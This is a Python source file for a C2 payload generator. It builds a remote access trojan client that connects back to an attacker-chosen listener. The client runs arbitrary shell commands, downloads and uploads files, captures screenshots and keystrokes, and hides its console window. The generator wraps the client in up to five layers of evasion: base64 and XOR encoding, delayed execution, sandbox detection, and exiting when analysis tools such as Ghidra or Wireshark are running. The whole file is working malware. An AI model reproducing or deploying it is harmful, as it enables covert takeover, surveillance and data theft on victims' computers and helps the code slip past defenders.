#!/usr/bin/env python3
"""
Complete C2 Payload with Full Functionality
- Reverse shell
- File operations (download, upload)
- Screenshots
- Keylogger
- System commands
- Obfuscation levels 1-5
"""

import base64
import os
import random
import string
from typing import Tuple


class C2PayloadGenerator:
    """Génère des payloads C2 complets avec toutes les fonctionnalités"""

    def __init__(
        self, listener_ip: str, listener_port: int, obfuscation_level: int = 2
    ):
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation_level = obfuscation_level

    def get_full_c2_code(self) -> str:
        """Code C2 complet avec toutes les fonctionnalités"""
        # Ne PAS utiliser f-string ici pour éviter les conflits avec PowerShell/autres syntaxes
        code_template = '''
import socket
import subprocess
import platform
import os
import sys
import base64
import json
import time
import threading

class C2Client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.socket = None
        self.running = True
        # Debug logging can be enabled at runtime by setting C2_DEBUG=1
        self.debug_mode = os.getenv('C2_DEBUG') == '1'
        self.debug_file = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_debug.log')
        self.startup_log = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_startup.log')
        self._write_startup_log('[C2CLIENT] Initialized with {0}:{1}'.format(ip, port))
    
    def _write_startup_log(self, msg):
        """Always write startup logs"""
        try:
            with open(self.startup_log, 'a') as f:
                f.write("{0} - {1}\\n".format(time.strftime('%H:%M:%S'), msg))
        except:
            pass
    
    def debug_log(self, msg):
        """Write debug info to file"""
        self._write_startup_log(msg)  # Always log
        if self.debug_mode:
            try:
                with open(self.debug_file, 'a') as f:
                    f.write("{0} - {1}\\n".format(time.strftime('%H:%M:%S'), msg))
            except:
                pass
    
    def connect(self):
        """Connect to C2 server"""
        try:
            self.debug_log("Attempting connection to {0}:{1}".format(self.ip, self.port))
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.ip, self.port))
            self.debug_log("Connection successful!")
            return True
        except Exception as e:
            self.debug_log("Connection failed: {0}".format(str(e)))
            return False
    
    def send_json(self, data):
        """Send JSON data"""
        try:
            msg = json.dumps(data).encode()
            self.socket.send(msg)
        except:
            pass
    
    def recv_json(self):
        """Receive JSON data"""
        try:
            data = self.socket.recv(4096).decode()
            if not data:
                self.debug_log("[RECV] Empty data received")
                return None
            result = json.loads(data)
            self.debug_log("[RECV] Received type: {0}, content: {1}".format(type(result).__name__, str(result)[:200]))
            
            # If result is a list, take the first element (listener might send as list)
            if isinstance(result, list):
                self.debug_log("[RECV] Received a list with {0} items, using first element".format(len(result)))
                if result:
                    result = result[0]
                else:
                    return None
            
            return result
        except json.JSONDecodeError as e:
            self.debug_log("[RECV] JSON decode error: {0}, data was: {1}".format(str(e), str(data)[:100]))
            return None
        except Exception as e:
            self.debug_log("[RECV] Error: {0}".format(str(e)))
            import traceback
            self.debug_log("[RECV] Traceback: {0}".format(traceback.format_exc()))
            return None
    
    def get_system_info(self):
        """Get system information"""
        return {{
            'type': 'info',
            'hostname': platform.node(),
            'platform': platform.system(),
            'user': os.getenv('USERNAME', 'unknown'),
            'ip': self.ip,
            'port': self.port
        }}
    
    def cmd_execute(self, cmd):
        """Execute system command"""
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8', errors='ignore')
        except Exception as e:
            return "Error: {0}".format(str(e))
    
    def cmd_download(self, file_path):
        """Download file"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            return {{
                'type': 'download',
                'success': True,
                'file': file_path,
                'data': base64.b64encode(data).decode(),
                'size': len(data)
            }}
        except Exception as e:
            return {{'type': 'download', 'success': False, 'error': str(e)}}
    
    def cmd_upload(self, file_path, file_data):
        """Upload file"""
        try:
            decoded = base64.b64decode(file_data)
            with open(file_path, 'wb') as f:
                f.write(decoded)
            return {{'type': 'upload', 'success': True, 'file': file_path}}
        except Exception as e:
            return {{'type': 'upload', 'success': False, 'error': str(e)}}
    
    def cmd_screenshot(self):
        """Capture screenshot"""
        try:
            import time as t
            filename = f"screenshot_{{int(t.time())}}.png"
            if platform.system() == 'Windows':
                # Utiliser une simple string avec % pour éviter les problèmes d'accolades des f-strings
                pwsh = (
                    'powershell -Command '
                    '"Add-Type -AssemblyName System.Windows.Forms;'
                    '[System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { '
                    '$bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); '
                    '$graphics = [System.Drawing.Graphics]::FromImage($bitmap); '
                    '$graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size); '
                    '$bitmap.Save(\\"%s\\"); '
                    '$graphics.Dispose(); '
                    '$bitmap.Dispose(); '
                    '}" 2>nul'
                )
                os.system(pwsh % (filename))
            else:
                # For Linux/Mac: éviter f-string imbriquée
                os.system('import -window root %s 2>/dev/null' % (filename))
            
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read()
                os.remove(filename)
                return {{
                    'type': 'screenshot',
                    'success': True,
                    'data': base64.b64encode(data).decode(),
                    'size': len(data)
                }}
        except:
            pass
        return {{'type': 'screenshot', 'success': False}}
    
    def cmd_keylogger(self, duration=60):
        """Simple keylogger"""
        try:
            keys = []
            def on_press(key):
                try:
                    keys.append(key.char if hasattr(key, 'char') else str(key))
                except:
                    pass
            
            try:
                from pynput import keyboard
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join(timeout=duration)
            except:
                pass
            
            return {{'type': 'keylog', 'keys': ''.join(keys)}}
        except:
            return {{'type': 'keylog', 'error': 'Failed'}}
    
    def handle_command(self, cmd_data):
        """Handle incoming command"""
        try:
            if not isinstance(cmd_data, dict):
                self.debug_log("[CMD] Error: cmd_data is not a dict, it's a {0}: {1}".format(type(cmd_data), str(cmd_data)[:100]))
                return {{'type': 'error', 'msg': 'Invalid command format'}}
            
            cmd_type = cmd_data.get('cmd')
            
            if cmd_type == 'exec':
                output = self.cmd_execute(cmd_data.get('data', ''))
                return {{'type': 'exec', 'output': output}}
            
            elif cmd_type == 'download':
                return self.cmd_download(cmd_data.get('file'))
            
            elif cmd_type == 'upload':
                return self.cmd_upload(cmd_data.get('file'), cmd_data.get('data'))
            
            elif cmd_type == 'screenshot':
                return self.cmd_screenshot()
            
            elif cmd_type == 'keylog':
                return self.cmd_keylogger(cmd_data.get('duration', 60))
            
            elif cmd_type == 'info':
                return self.get_system_info()
            
            elif cmd_type == 'exit':
                self.running = False
                return {{'type': 'exit'}}
            
            self.debug_log("[CMD] Unknown command type: {0}".format(cmd_type))
            return {{'type': 'error', 'msg': 'Unknown command'}}
        except Exception as e:
            self.debug_log("[CMD] Exception in handle_command: {0}".format(str(e)))
            import traceback
            self.debug_log("[CMD] Traceback: {0}".format(traceback.format_exc()))
            return {{'type': 'error', 'msg': str(e)}}
    
    def run(self):
        """Main loop with retry logic"""
        self.debug_log("[RUN] Starting C2 client main loop")
        max_retries = 10
        retry_delay = 5
        
        for attempt in range(max_retries):
            self.debug_log("[RUN] Connection attempt {0}/{1}".format(attempt + 1, max_retries))
            if self.connect():
                try:
                    self.debug_log("[RUN] Connected! Sending system info...")
                    # Send initial info
                    self.send_json(self.get_system_info())
                    self.debug_log("[RUN] Entering command loop...")
                    
                    # Command loop
                    while self.running:
                        cmd_data = self.recv_json()
                        if not cmd_data:
                            self.debug_log("[RUN] No command received, breaking loop")
                            break
                        
                        self.debug_log("[RUN] About to call handle_command with: {0}".format(str(cmd_data)[:150]))
                        response = self.handle_command(cmd_data)
                        self.debug_log("[RUN] Response: {0}".format(str(response)[:150]))
                        self.send_json(response)
                except Exception as e:
                    self.debug_log("[RUN] Exception in command loop: {0}".format(str(e)))
                    import traceback
                    self.debug_log("[RUN] Traceback: {0}".format(traceback.format_exc()))
                finally:
                    try:
                        self.socket.close()
                    except:
                        pass
                
                # If we get here, connection was lost, retry
                if self.running:
                    self.debug_log("[RUN] Connection lost, waiting {0}s before retry...".format(retry_delay))
                    time.sleep(retry_delay)
            else:
                # Connection failed, wait and retry
                self.debug_log("[RUN] Connection attempt {0} failed, waiting {1}s...".format(attempt + 1, retry_delay))
                time.sleep(retry_delay)
        
        self.debug_log("[RUN] Max retries exceeded, exiting")

if __name__ == '__main__':
    # Self-test mode for CI (no network, fast exit)
    try:
        if ('--self-test' in sys.argv) or (os.getenv('SELFTEST') == '1'):
            # Minimal checks that don't require network or UI
            try:
                import base64, json
                _ = base64.b64encode(b'ok').decode()
                # Exit 0 means OK
                sys.exit(0)
            except Exception:
                # Non-zero exit signals failure in CI
                sys.exit(2)
    except Exception:
        # Ignore and continue normal run
        pass

    # Write startup log
    startup_log = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_startup.log')
    try:
        with open(startup_log, 'a') as f:
            f.write("[MAIN] C2 client starting\\n")
    except:
        pass

    # Detach from console on Windows
    if sys.platform.startswith('win'):
        try:
            import ctypes
            with open(startup_log, 'a') as f:
                f.write("[MAIN] Calling FreeConsole()\\n")
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.FreeConsole()
            with open(startup_log, 'a') as f:
                f.write("[MAIN] FreeConsole() success\\n")
        except Exception as e:
            with open(startup_log, 'a') as f:
                f.write("[MAIN] FreeConsole() error: {0}\\n".format(str(e)))

    try:
        with open(startup_log, 'a') as f:
            f.write("[MAIN] Creating C2Client({0}, {1})\\n".format(__LISTENER_IP_STR__, __LISTENER_PORT_STR__))
        client = C2Client(__LISTENER_IP__, __LISTENER_PORT__)
        with open(startup_log, 'a') as f:
            f.write("[MAIN] Calling client.run()\\n")
        client.run()
        with open(startup_log, 'a') as f:
            f.write("[MAIN] client.run() completed\\n")
    except Exception as e:
        with open(startup_log, 'a') as f:
            f.write("[MAIN] Exception: {0}\\n".format(str(e)))
        import traceback
        with open(startup_log, 'a') as f:
            f.write("[MAIN] Traceback: {0}\\n".format(traceback.format_exc()))
'''
        # Remplacer les placeholders par les vraies valeurs
        result = code_template.replace("__LISTENER_IP__", repr(self.listener_ip))
        result = result.replace("__LISTENER_PORT__", str(self.listener_port))
        result = result.replace("__LISTENER_IP_STR__", repr(self.listener_ip))
        result = result.replace("__LISTENER_PORT_STR__", repr(self.listener_port))
        return result

    def obfuscate_level_1(self, code: str) -> str:
        """Niveau 1: Base64"""
        encoded = base64.b64encode(code.encode()).decode()
        return f"""
import base64, sys, os, platform, socket, subprocess, json, time, threading
from pathlib import Path

# Logging setup - MUST BE FIRST
def _emergency_log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(msg + '\\n')
    except:
        pass

_emergency_log('[STARTUP] Level 1 obfuscation starting')
_emergency_log('[STARTUP] Python version: ' + str(sys.version))
_emergency_log('[STARTUP] Platform: ' + sys.platform)

try:
    code = base64.b64decode('{encoded}').decode()
    _emergency_log('[STARTUP] Successfully decoded payload')
except Exception as e:
    _emergency_log('[ERROR] Failed to decode: ' + str(e))
    raise

try:
    import ctypes  # For Windows FreeConsole()
    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
    _emergency_log('[STARTUP] Executing payload...')
    exec(code, g)
except Exception as e:
    _emergency_log('[ERROR] Execution failed: ' + str(e))
    import traceback
    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
    raise
"""

    def obfuscate_level_2(self, code: str) -> str:
        """Niveau 2: XOR + Base64 + Délais"""
        key = random.randint(1, 255)
        code_bytes = code.encode("utf-8")
        xored_bytes = bytes(b ^ key for b in code_bytes)
        encoded = base64.b64encode(xored_bytes).decode("ascii")
        delay = random.randint(1, 3)

        return f"""
import base64, time, sys, os, platform, socket, subprocess, json, threading
from pathlib import Path

# Logging setup - MUST BE FIRST
def _emergency_log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(msg + '\\n')
    except:
        pass

_emergency_log('[STARTUP] Level 2 obfuscation starting')
_emergency_log('[STARTUP] Python version: ' + str(sys.version))

try:
    time.sleep({delay})
    _emergency_log('[STARTUP] Delay complete, decoding payload...')
    key = {key}
    xored = base64.b64decode('{encoded}')
    code = ''.join(chr(b ^ key) for b in xored)
    _emergency_log('[STARTUP] Successfully decoded payload')
except Exception as e:
    _emergency_log('[ERROR] Failed to decode: ' + str(e))
    raise

try:
    import ctypes  # For Windows FreeConsole()
    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
    _emergency_log('[STARTUP] Executing payload...')
    exec(code, g)
except Exception as e:
    _emergency_log('[ERROR] Execution failed: ' + str(e))
    import traceback
    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
    raise
"""

    def obfuscate_level_3(self, code: str) -> str:
        """Niveau 3: Sandbox Detection"""
        key = random.randint(1, 255)
        code_bytes = code.encode("utf-8")
        xored_bytes = bytes(b ^ key for b in code_bytes)
        encoded = base64.b64encode(xored_bytes).decode("ascii")
        delay = random.randint(5, 15)

        return f"""
import base64, time, os, sys, platform, socket, subprocess, json, threading
from pathlib import Path

# Logging setup - MUST BE FIRST
def _emergency_log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(msg + '\\n')
    except:
        pass

_emergency_log('[STARTUP] Level 3 obfuscation starting')

def is_sandboxed():
    sandbox_indicators = ["VBoxService", "VBoxTray", "vmtoolsd", "qemu-ga", "sandbox", "virtualbox"]
    try:
        import subprocess
        result = subprocess.check_output("tasklist", shell=True).decode().lower()
        return any(ind in result for ind in sandbox_indicators)
    except:
        return False

if is_sandboxed():
    _emergency_log('[SANDBOX] Detected, exiting')
    sys.exit()

try:
    time.sleep({delay})
    _emergency_log('[STARTUP] Decoding payload...')
    key = {key}
    xored = base64.b64decode('{encoded}')
    code = ''.join(chr(b ^ key) for b in xored)
    _emergency_log('[STARTUP] Successfully decoded payload')
except Exception as e:
    _emergency_log('[ERROR] Failed to decode: ' + str(e))
    raise

try:
    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
    _emergency_log('[STARTUP] Executing payload...')
    exec(code, g)
except Exception as e:
    _emergency_log('[ERROR] Execution failed: ' + str(e))
    import traceback
    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
    raise
"""

    def obfuscate_level_4(self, code: str) -> str:
        """Niveau 4: Dynamic Imports"""
        key = random.randint(1, 255)
        code_bytes = code.encode("utf-8")
        xored_bytes = bytes(b ^ key for b in code_bytes)
        encoded = base64.b64encode(xored_bytes).decode("ascii")
        delay = random.randint(5, 15)

        return f"""
import base64, time, sys, os
from pathlib import Path

# Logging setup - MUST BE FIRST
def _emergency_log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(msg + '\\n')
    except:
        pass

_emergency_log('[STARTUP] Level 4 obfuscation starting (dynamic imports)')

try:
    socket_module = __import__('socket')
    subprocess_module = __import__('subprocess')
    platform_module = __import__('platform')
    json_module = __import__('json')
    threading_module = __import__('threading')
    ctypes_module = __import__('ctypes')  # For Windows FreeConsole()
    _emergency_log('[STARTUP] All modules imported successfully')
except Exception as e:
    _emergency_log('[ERROR] Failed to import modules: ' + str(e))
    raise

try:
    time.sleep({delay})
    _emergency_log('[STARTUP] Decoding payload...')
    key = {key}
    xored = base64.b64decode('{encoded}')
    code = ''.join(chr(b ^ key) for b in xored)
    _emergency_log('[STARTUP] Successfully decoded payload')
except Exception as e:
    _emergency_log('[ERROR] Failed to decode: ' + str(e))
    raise

try:
    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module, 'ctypes': ctypes_module}}
    _emergency_log('[STARTUP] Executing payload...')
    exec(code, g)
except Exception as e:
    _emergency_log('[ERROR] Execution failed: ' + str(e))
    import traceback
    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
    raise
"""

    def obfuscate_level_5(self, code: str) -> str:
        """Niveau 5: MAXIMUM"""
        key = random.randint(1, 255)
        code_bytes = code.encode("utf-8")
        xored_bytes = bytes(b ^ key for b in code_bytes)
        encoded = base64.b64encode(xored_bytes).decode("ascii")
        delay = random.randint(3, 8)

        return f"""
import base64, time, sys, os, platform, socket, subprocess, json, threading
from pathlib import Path

# Logging setup - MUST BE FIRST
def _emergency_log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(msg + '\\n')
    except:
        pass

_emergency_log('[STARTUP] Level 5 obfuscation starting (EXTREME)')

def extreme_check():
    try:
        import subprocess
        result = subprocess.check_output("tasklist", shell=True).decode().lower()
        dangerous = ["ida", "ghidra", "ollydbg", "windbg", "x64dbg", "wireshark", "burp", "fiddler"]
        if any(d in result for d in dangerous):
            _emergency_log('[DEBUGGER] Detected, exiting')
            sys.exit(1)
    except:
        pass

extreme_check()

try:
    time.sleep({delay})
    _emergency_log('[STARTUP] Decoding payload...')
    key = {key}
    xored = base64.b64decode('{encoded}')
    code = ''.join(chr(b ^ key) for b in xored)
    _emergency_log('[STARTUP] Successfully decoded payload')
except Exception as e:
    _emergency_log('[ERROR] Failed to decode: ' + str(e))
    raise

try:
    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
    _emergency_log('[STARTUP] Executing payload...')
    exec(code, g)
except Exception as e:
    _emergency_log('[ERROR] Execution failed: ' + str(e))
    import traceback
    _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
    raise
"""

    def generate(self) -> str:
        """Génère le payload obfusqué"""
        code = self.get_full_c2_code()

        if self.obfuscation_level == 1:
            return self.obfuscate_level_1(code)
        elif self.obfuscation_level == 2:
            return self.obfuscate_level_2(code)
        elif self.obfuscation_level == 3:
            return self.obfuscate_level_3(code)
        elif self.obfuscation_level == 4:
            return self.obfuscate_level_4(code)
        elif self.obfuscation_level == 5:
            return self.obfuscate_level_5(code)
        return code
